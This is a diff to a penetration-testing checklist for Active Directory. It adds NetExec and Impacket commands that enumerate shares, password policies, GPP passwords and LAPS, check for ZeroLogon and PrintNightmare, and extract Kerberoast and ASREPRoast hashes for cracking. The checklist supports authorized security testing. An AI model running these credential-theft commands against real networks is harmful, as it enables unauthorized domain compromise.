@@ -44,7 +44,7 @@ After identifying live hosts:
 
 Run Nessus scans to identify vulnerabilities.&#x20;
 
-- One without credentials at the start.
+- Using the information from the host discovery phase, run Nessus scans on the identified hosts.
 
 ### Null Sessions / Anonymous Logons
 
@@ -274,14 +274,11 @@ run
 - Example:
 
 ```bash
-python KyoceraCreds.py --target <ip>
+# Use Nmap to detect vulnerable printers:
+  nmap -p 9100 --script=printer-ready-info
 ```
-
 - Use Nmap to detect vulnerable printers:
-  nmap -p 9100 --script=printer-ready-info&#x20;
-
-````
-
+  nmap -p 9100 --script=printer-ready-info
 ---
 
 ## Usernames with No Passwords
@@ -296,29 +293,86 @@ Test common passwords against user accounts to identify weak credentials.
 # Enumerate and crack accounts vulnerable to ASREPRoasting.
 GetNPUsers.py -request -usersfile users.txt -format hashcat -outputfile ASREPRoastables.txt domain/user:pass
 hashcat -m 18200 <ASREPRoastables.txt> <wordlist>
-````
+```
+
+
 
 ---
 
-## User Credentials
+## With User Credentials / Low Privileges
+
+### NXC Checlist for enumeration with user credentials / low privileges
+#### SMB Commands
+```bash
+# Enumerate users
+nxc smb <target-ip> -u <username> -p <password> --users
+# Enumerate shares
+nxc smb <target-ip> -u <username> -p <password> --shares
+# Enumerate password policy
+nxc smb <target-ip> -u <username> -p <password> --pass-pol
+# Enumerate Anti Virus
+nxc smb <target-ip> -u <username> -p <password> -M enum_av
+# Enumerate ADCS
+nxc smb <target-ip> -u <username> -p <password> -M enum_ca
+# Enumerate GPP Autologin and Passwords
+nxc smb <target-ip> -u <username> -p <password> -M gpp_autologin
+nxc smb <target-ip> -u <username> -p <password> -M gpp_password
+# Enumerate Nopac
+nxc smb <target-ip> -u <username> -p <password> -M nopac
+# Enumerate Printnightmare
+nxc smb <target-ip> -u <username> -p <password> -M printnightmare
+# Enumerate ZeroLogon
+nx smb <target-ip> -u <username> -p <password> -M zerologon
+```
+#### LDAP Commands
+```bash
+# Enumerate MAQ (Machine Account Quota)
+nxc ldap <dc-ip> -u <username> -p <password> -M maq
+# Enumerate ADCS
+nxc ldap <dc-ip> -u <username> -p <password> -M adcs
+# Enumerate LDAP
+nxc ldap <dc-ip> -u <username> -p <password> -M ldap-checker
+# Enumerate LAPS (Local Administrator Password Solution)
+nxc ldap <dc-ip> -u <username> -p <password> -M laps
+```
 
 ### Kerberoasting
 
 ```bash
 # Enumerate service accounts for Kerberoasting.
+# Netexec Kerberoast
+nxc ldap <dc-ip> -u <username> -p <password> --kerberoast kerberoast.txt
+nxc ldap <dc-ip> -u <username> -H <HASH> --kerberoast kerberoast.txt
+# Impacket
 GetUserSPNs.py -request -dc-ip <dc-ip> -target-domain domain.local username:password
 ```
+
+### ASREPRoasting
+```bash
+# Netexec ASREPRoast (requires a username list)
+nxc ldap <dc-ip> -u usernameslist.txt -p '' --asreproast asreproast.txt
+# Netexec ASREPRoast (requires a username and password or hash)
+nxc ldap <dc-ip> -u <username> -p <password> --asreproast asreproast.txt
+nxc ldap <dc-ip> -u <username> -H <HASH> --asreproast asreproast.txt
+
+# Impacket ASREPRoast (requires a username wordlist)
+GetNPUsers.py -request -usersfile users.txt -format hashcat -outputfile ASREPRoastables.txt domain/user:pass
+```
+
 
 ### BloodHound
 
 ```bash
 # Collect Active Directory data for analysis in BloodHound.
-bloodhound-python -u <username> -p '<password>' -d <domain> -ns <dc-ip> -c "all"
+bloodhound-python -u <username> -p '<password>' -d <domain> -c All --zip
+
+# Bloodhound with Netexec
+nxc ldap <dc-ip> -u <username> -p <password> --bloodhound --collection All
 ```
 
 ## Domain Admin Credentials
 
-One with Domain Admin (DA) credentials after escalation.
+Run with Domain Admin (DA) credentials after escalation.
 
 ### Shared Locals
 
